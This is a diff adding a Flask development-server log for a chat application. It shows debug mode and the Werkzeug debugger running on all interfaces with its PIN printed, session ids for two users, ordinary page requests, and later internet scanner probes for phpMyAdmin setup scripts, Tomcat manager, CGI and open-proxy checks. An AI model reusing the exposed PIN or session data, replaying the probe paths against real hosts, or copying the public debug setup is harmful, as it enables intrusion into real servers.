@@ -1,0 +1,1247 @@
+nohup: ignoring input
+ * Serving Flask app 'app'
+ * Debug mode: on
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8080
+ * Running on http://192.168.14.101:8080
+[33mPress CTRL+C to quit[0m
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 432-988-744
+/root/chatAI/app.py:49: LegacyAPIWarning: The Query.get() method is considered legacy as of the 1.x series of SQLAlchemy and becomes a legacy construct in 2.0. The method is now available as Session.get() (deprecated since: 2.0) (Background on SQLAlchemy 2.0 at: https://sqlalche.me/e/b8d9)
+  user = User.query.get(int(user_id))
+111.55.166.5 - - [19/Sep/2024 15:58:39] "GET / HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:40] "GET / HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:40] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:40] "[36mGET /static/uploads/0fa09b6122171798cf2f58e35112a400.jpg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:40] "[36mGET /static/svg/clear.svg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:40] "[36mGET /static/js/script.js HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:40] "[36mGET /static/uploads/system.jpg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:40] "GET /get_history HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:40] "[36mGET /static/svg/delete.svg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:43] "[32mGET /logout HTTP/1.1[0m" 302 -
+111.55.166.5 - - [19/Sep/2024 15:58:43] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:43] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:45] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:45] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:45] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:45] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:46] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:46] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:46] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:46] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:52] "[32mGET / HTTP/1.1[0m" 302 -
+111.55.166.5 - - [19/Sep/2024 15:58:52] "GET /login?next=/ HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:52] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:57] "[32mPOST /login?next=/ HTTP/1.1[0m" 302 -
+111.55.166.5 - - [19/Sep/2024 15:58:57] "GET / HTTP/1.1" 200 -
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:39.094150+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:40.444752+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:40.538686+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:40.608334+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:40.643619+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:40.665314+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:40.805938+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:40.808883+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:40.921876+08:00', 'user_id': 1}>
+Loading user: <User 1>
+User loaded: ID=1, Username=tom
+Before request - Current user: <User 1>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '1', 'last_active': '2024-09-19T15:58:43.288661+08:00', 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98dccf50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'user_id': 1, '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98dce590>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98448690>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98454250>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98454e90>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e984560d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98456d50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98456a50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98456d10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98457b50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98445f50>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98445190>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_flashes': [('message', 'Please log in to access this page.')], '_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98445450>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98445c10>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 1}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:57.398200+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:57.532148+08:00', 'user_id': 2}>
+Loading user: <User 2>
+111.55.166.5 - - [19/Sep/2024 15:58:57] "[36mGET /static/js/script.js HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:57] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:57] "[36mGET /static/uploads/user.jpg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:57] "[36mGET /static/svg/clear.svg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:57] "GET /get_history HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:57] "[36mGET /static/uploads/system.jpg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:57] "[36mGET /static/svg/delete.svg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 15:58:59] "POST /log_click HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:58:59] "GET /get_conversation/4 HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 15:59:00] "POST /log_click HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 16:00:06] "GET / HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 16:00:06] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:00:06] "[36mGET /static/svg/clear.svg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:00:06] "[36mGET /static/uploads/user.jpg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:00:06] "[36mGET /static/js/script.js HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:00:06] "[36mGET /static/uploads/system.jpg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:00:06] "GET /get_history HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 16:00:06] "[36mGET /static/svg/delete.svg HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:00:10] "[32mGET /logout HTTP/1.1[0m" 302 -
+111.55.166.5 - - [19/Sep/2024 16:00:10] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 16:00:10] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:57.533371+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:57.552420+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:57.555707+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:57.635871+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:57.650385+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:57.746148+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:59.052249+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:58:59.053008+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T15:59:00.879387+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:06.051210+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:06.139723+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:06.171939+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:06.175023+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:06.210757+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:06.329216+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:06.329934+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:06.449167+08:00', 'user_id': 2}>
+Loading user: <User 2>
+User loaded: ID=2, Username=test
+Before request - Current user: <User 2>
+Before request - Is authenticated: True
+Before request - Session: <SecureCookieSession {'_fresh': True, '_id': '68a60c2d64dcfdce2a2c1bc30ccbad2701edb0c668e191f7bb2d2722fb5f0a6f2e192ce4f63cecae73404c6e844e0101c3e7dd6903ad08bcbbad8dc3399f9fa2', '_user_id': '2', 'last_active': '2024-09-19T16:00:10.161023+08:00', 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848a610>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'user_id': 2, '_fresh': False}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e9848a7d0>
+Before request - Is authenticated: False
+Before request - Session: <SecureCookieSession {'_fresh': False, 'user_id': 2}>
+Before request - Current user: <flask_login.mixins.AnonymousUserMixin object at 0x7f6e98444810>
+Before request - Is authenticated: False
+111.55.166.5 - - [19/Sep/2024 16:00:11] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 16:00:11] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:00:11] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 16:00:11] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+111.55.166.5 - - [19/Sep/2024 16:00:12] "GET /login HTTP/1.1" 200 -
+111.55.166.5 - - [19/Sep/2024 16:00:12] "[36mGET /static/css/auth.css HTTP/1.1[0m" 304 -
+1.92.151.215 - - [19/Sep/2024 16:02:07] code 400, message Bad request version ("ûÞ\x83ì[J\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+1.92.151.215 - - [19/Sep/2024 16:02:07] "[31m[1m\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03 k»b\x83Ë\x90M Èät\x029çÊJ\x93L±\x91ò¯\x0fõ©³N\x88Ý¶e l9µÐ)DK\x93«\x97ë/¿î\x96LñÚ >2Þ\x1bG\x82\x85ûÞ\x83ì[J\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
+1.92.151.215 - - [19/Sep/2024 16:02:09] "[32mHEAD / HTTP/1.1[0m" 302 -
+1.92.151.215 - - [19/Sep/2024 16:02:10] "[32mGET / HTTP/1.1[0m" 302 -
+1.92.151.215 - - [19/Sep/2024 16:02:10] "GET /login?next=/ HTTP/1.1" 200 -
+120.46.51.19 - - [19/Sep/2024 16:12:52] code 400, message Bad request version ("t\x11¥Ã÷\x82\xadþ¾~\x06²Ø\x84uÊÚ.\x16ß\x13ÚÄB:Îðd\x157ãå\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+120.46.51.19 - - [19/Sep/2024 16:12:52] "[31m[1m\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Å[`/B`âÌØU®\x16\x1f\x8f\x07\x06ßÁ6ð¤©#²\x9a\x879\x00R.T\x09 t\x11¥Ã÷\x82­þ¾~\x06²Ø\x84uÊÚ.\x16ß\x13ÚÄB:Îðd\x157ãå\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
+120.46.51.19 - - [19/Sep/2024 16:12:52] code 400, message Bad request version ("ß\x88\x8e÷}a\x7fõp\x10Äg6jþÜ\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+120.46.51.19 - - [19/Sep/2024 16:12:52] "[31m[1m\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03RUÆ,à\x8dOßñíþ\x99\x09Öty×\x8b\x15h¯¥\x08´\x8bíKýO8eq \x172õ\x99\x0fþ\x82²\x03Y$¡¹\x11£\x0cß\x88\x8e÷}a\x7fõp\x10Äg6jþÜ\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ[0m" 400 -
+120.46.51.19 - - [19/Sep/2024 16:12:52] "[32mHEAD / HTTP/1.1[0m" 302 -
+120.46.51.19 - - [19/Sep/2024 16:12:52] "[32mGET / HTTP/1.1[0m" 302 -
+120.46.51.19 - - [19/Sep/2024 16:12:52] "GET /login?next=/ HTTP/1.1" 200 -
+120.46.51.19 - - [19/Sep/2024 16:12:52] "GET /static/css/auth.css HTTP/1.1" 200 -
+120.46.51.19 - - [19/Sep/2024 16:12:53] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+208.87.243.131 - - [19/Sep/2024 16:16:51] "[32mGET http://azenv.net/ HTTP/1.1[0m" 302 -
+208.87.243.131 - - [19/Sep/2024 16:16:52] "GET http://azenv.net/login?next=/ HTTP/1.1" 200 -
+167.172.151.104 - - [19/Sep/2024 16:23:32] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+87.236.176.198 - - [19/Sep/2024 16:25:29] "[32mGET / HTTP/1.1[0m" 302 -
+87.236.176.198 - - [19/Sep/2024 16:25:30] "GET /login?next=/ HTTP/1.1" 200 -
+45.156.129.52 - - [19/Sep/2024 16:58:30] "[33mGET /cgi-bin/main.pl HTTP/1.1[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:11] "[33mGET http://121.37.244.30:8080/phpMyAdmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:11] "[33mGET http://121.37.244.30:8080/phpmyadmin/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:12] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:12] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:12] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:12] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:13] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:13] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:13] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:14] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:14] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:14] "[33mGET http://121.37.244.30:8080/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:15] "[33mGET http://121.37.244.30:8080/pma/scripts/setup.php HTTP/1.0[0m" 404 -
+220.122.91.84 - - [19/Sep/2024 16:59:15] "[33mGET http://121.37.244.30:8080/phpMyAdmin3/scripts/setup.php HTTP/1.0[0m" 404 -
